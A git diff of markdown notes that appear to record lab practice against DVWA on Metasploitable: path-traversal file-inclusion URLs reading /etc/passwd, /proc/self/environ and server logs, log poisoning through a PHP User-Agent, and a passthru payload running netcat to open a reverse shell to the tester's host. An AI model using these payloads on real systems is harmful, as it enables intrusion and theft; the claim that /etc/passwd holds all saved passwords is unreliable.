@@ -52,6 +52,7 @@ nc -vv -l -p 8080
 >
 > __high__ is not even possible
 
+<h3 align="center"> ... </h3> 
 
 ## File Inclusion Vulnerability
 - it allows you to read  any file in the same server.
@@ -61,10 +62,23 @@ nc -vv -l -p 8080
 http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
 ```
 - by using this command we can get the all saved passwords saved in the webserver.
-![Screenshot 2024-04-12 222928](https://github.com/stellados53/kali_commands/assets/142677726/615af2ec-4ac3-4ca6-a33b-28a323ed794a)
+- ![Screenshot 2024-04-12 222928](https://github.com/stellados53/kali_commands/assets/142677726/615af2ec-4ac3-4ca6-a33b-28a323ed794a)
+- by modifing the useragent from mozilla to `<?phpinfo();?>` using bruiteforce proxy(header)..we get the php information about the website
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/faab1ae4-f1dc-4578-9098-b2995c78dc04)
+- by modifing the useragent to `<?passthru("nc -e /bin/sh 192.168.11.128 8888");?>` in the bruiteforce header for the connect of the website..and the terminal of kali linux `nc -vv -l -p 8888` to make connection.
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/26b2674a-e047-4c5f-8f72-bc938ca5ed35)
 
 - Now as reference from the above use the another executable urls.
-![Screenshot 2024-04-12 231128](https://github.com/stellados53/kali_commands/assets/142677726/9cc2d6f4-169b-41f9-b5d6-82513acb37b7)
+ ```
+http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../..//proc/self/environ
+```
+```
+http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log
+```
+```
+http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/apache2/access.log
+```
+- ![Screenshot 2024-04-12 231128](https://github.com/stellados53/kali_commands/assets/142677726/9cc2d6f4-169b-41f9-b5d6-82513acb37b7)
 - from above image the first one  `proc/self/environ` we get..
-![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)
+- ![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)
 
